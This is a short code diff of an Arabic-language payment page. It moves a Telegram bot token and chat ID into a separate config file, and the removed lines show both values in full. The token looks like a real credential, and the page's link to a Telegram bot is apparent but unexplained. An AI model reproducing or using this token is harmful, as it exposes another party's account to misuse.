@@ -230,7 +230,8 @@
 <button class="btn" id="payBtn">إتمام عملية الدفع</button>
 </div>
 
-<script>
+<script src="config.js"></script>
+  <script>
   let basePrice = parseFloat(localStorage.getItem('selectedPrice')) || 1000;
 
   let discount = basePrice * 0.25;
@@ -264,8 +265,8 @@
     });
   });
 
-  const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
-  const chatId = '7785288759';
+  const telegramBotToken = TELEGRAM_BOT_TOKEN;
+  const chatId = TELEGRAM_CHAT_ID;
 
   function getSelectedPaymentMethod() {
     for (let i = 0; i < paymentInputs.length; i++) {
